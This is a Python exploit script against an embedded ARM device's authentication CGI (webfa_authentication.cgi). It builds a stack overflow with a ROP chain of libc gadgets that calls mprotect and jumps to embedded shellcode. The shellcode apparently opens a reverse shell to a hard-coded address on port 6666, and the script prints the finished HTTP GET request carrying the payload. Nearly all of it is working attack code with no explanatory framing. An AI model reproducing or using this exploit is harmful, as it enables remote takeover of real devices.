#!/usr/bin/python

from struct import pack
from urllib import quote

#$| = 1;                   # turn off output buffering

##### HELPER FUNCTIONS FOR ROP CHAINING #####

# function to create a libc gadget
# requires a global variable called $libc_base;
def libc(libc_base, offset):
   return(pack("<I", libc_base + offset))

# function to represent data on the stack
def data(value):
   return(pack("<I", value));




libc_base = 0x400a7000  # libc base address
initial_lr = 0x00043330 # pop {lr}; add sp, sp, #8; bx lr; 
pop_pc_gadget = 0x00049c70 # ldm sp!, {pc}; mov r0, #1; bx lr;
set_r1_r2 = 0x00015f0c #pop {r1, r2, r3, pc}; 
update_r2 = 0x00052974 #add r2, r2, #0x20; and r0, r0, #3; add r0, r2, r0; pop {r4, pc};
#set_r1 = 0x0005b028  #pop {r1, pc}; 
#set_r0_7 = 0x000d68ec
#mov_r2_r0 = 0x0002cc78
mov_r0_r5 = 0x00014fe4 # mov r0, r5; pop {r4, r5, r7, pc};
and_r0_r3 = 0x00040634 # and r0, r3, r0; bx lr; 
pop_r0_mask = 0x00078fac
bwand_r0_r3 = 0x00064934
mprotect = 0x16760
bx_sp = 0x000061d5
port = 6666

shellcode = "\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x02\x20\x01\x21\x52\x40\xc8\x27\x51\x37\x01\xdf\x03\x1c\x09\xa1\x4a\x70\x10\x22\x02\x37\x01\xdf\x3f\x27\x03\x21\x18\x1c\x01\x39\x01\xdf\xfb\xd1\x05\xa0\x52\x40\x05\xb4\xc2\x71\x69\x46\x0b\x27\x01\xdf\xc0\x46\x02\xff" + pack(">H", port) + chr(10) + chr(20) + chr(3) + chr(2) + "\x2f\x62\x69\x6e\x2f\x73\x68\x5a"

buf = ""
buf += "A" * 408

buf += libc(libc_base, initial_lr) #pop {lr}; add sp, sp, #8; bx lr; 
buf += libc(libc_base, pop_pc_gadget) # ldm sp!, {pc}; mov r0, #1; bx lr;
buf += data(0x45454545) #JUNK
buf += data(0x45454545) #JUNK
buf += libc(libc_base, set_r1_r2) #pop {r1, r2, r3, pc};
buf += data(0x01010101) #set R1
buf += data(0xFFFFFFE7) #initial R2 value
buf += data(0xfffff001) #JUNK R3
buf += libc(libc_base, update_r2) #add r2, r2, #0x20; and r0, r0, #3; add r0, r2, r0; pop {r4, pc}; 
buf += data(0x47474747) #JUNK R4
buf += libc(libc_base, mov_r0_r5); #mov r0, r5; pop {r4, r5, r7, pc};
buf += data(0x47474747) #JUNK R4
buf += data(0x47474747) #JUNK R4
buf += data(0x47474747) #JUNK R4
buf += libc(libc_base, and_r0_r3) # and r0, r3, r0; bx lr; 
buf += libc(libc_base, mprotect) #mprotect call
#buf += data(0x48484848) #CRASH
buf += libc(libc_base, bx_sp) #bx sp
buf += shellcode

# URL Encode
#uri =~ s/([^A-Za-z0-9\/])/sprintf("%%%02X", ord($1))/seg

user_id = quote(buf)
uri = "/webfa_authentication.cgi?id=" + user_id +"&password=x"


request = "GET " + uri + " HTTP/1.0\n\n"
print request


##### HELPER FUNCTIONS FOR ROP CHAINING #####

# function to create a libc gadget
# requires a global variable called $libc_base;
#def libc(libc_base, offset):
#   return(pack("<I", libc_base + offset))

# function to represent data on the stack
#def data(value):
#   return(pack("<I", value));


# function to check for bad characters
# run this before sending out the payload
# e.g. badchars($payload, "\x00\x0a\x0d/?");
#sub detect_badchars {
#   my ($string, $badchars) = @_;

#   my $i;

#   foreach $badchar (split(//, $badchars)) {
#      $i = index($string, $badchar);
#      while($i != -1) {
#         printf STDERR "[!] 0x%02x appears at position %d\n", ord($badchar), $i;
#         $i = index($string, $badchar, ++$i);
#      }
#   }
#}

